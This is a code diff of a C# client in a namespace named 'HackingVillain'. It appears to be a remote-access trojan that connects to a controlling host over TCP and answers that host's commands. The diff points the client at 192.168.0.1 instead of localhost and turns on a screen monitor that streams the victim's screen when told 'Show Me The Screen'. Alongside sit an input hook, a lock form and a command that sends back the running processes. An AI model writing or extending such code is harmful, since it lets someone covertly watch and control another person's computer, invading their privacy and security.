@@ -18,15 +18,15 @@ namespace HackingVillain
     {
         ISocket _client;
         Hooker _hook;
-        ScreenMonitor _monitor;
         LockForm _lock;
         Thread _listen;
+        ScreenMonitor _monitor;
         public Client()
         {
             InitializeComponent();
-            _client = AweSock.TcpConnect("127.0.0.1", 8080);
+            _client = AweSock.TcpConnect("192.168.0.1", 8080);
             _hook = new Hooker(_client);
-            //_monitor = new ScreenMonitor(_client);
+            _monitor = new ScreenMonitor(_client);
             _lock = new LockForm(_hook);
 
             _listen = new Thread(() =>
@@ -34,6 +34,7 @@ namespace HackingVillain
                 while (true)
                 {
                     Listen();
+                    Thread.Sleep(1000);
                 }
             });
 
@@ -84,8 +85,18 @@ namespace HackingVillain
             else if(data == "Show Me The Process")
             {
                 var processes = from p in Process.GetProcesses()
+                                where p.MainWindowTitle.Length > 0
                                 select p.ProcessName;
                 Send(string.Join("\n", processes));
+            }
+            else if (data == "Show Me The Screen")
+            {
+                _monitor.Start();
+                //ScreenMonitor.SendScreen(_client);
+            }
+            else if (data == "Stop Showing")
+            {
+                _monitor.Stop();
             }
         }
     }
